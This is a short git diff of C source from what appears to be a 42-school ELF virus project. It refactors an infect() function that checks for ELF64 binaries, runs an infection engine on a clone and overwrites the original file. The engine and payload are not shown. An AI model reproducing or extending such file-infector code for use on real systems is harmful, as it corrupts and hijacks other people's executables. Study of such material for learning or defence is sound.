@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/27 01:12:34 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 01:44:00 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -45,7 +45,7 @@ static bool	is_elf64(const char *file)
 	return true;
 }
 
-inline bool	infect(const char *file, uint64_t seed[2])
+inline bool	infect(const char *file)
 {
 	struct safe_ptr	original_ref = {.ptr = NULL};
 	struct safe_ptr	clone_ref = {.ptr = NULL};
@@ -55,7 +55,7 @@ inline bool	infect(const char *file, uint64_t seed[2])
 	if (!is_elf64(file)
 	|| !init_original_safe(&original_ref, file)
 	|| !init_clone_safe(&clone_ref, original_ref.size)
-	|| !infection_engine(clone_ref, original_ref, seed)
+	|| !infection_engine(clone_ref, original_ref)
 	|| !write_file(clone_ref, file))
 	{
 		free_accessor(&original_ref);
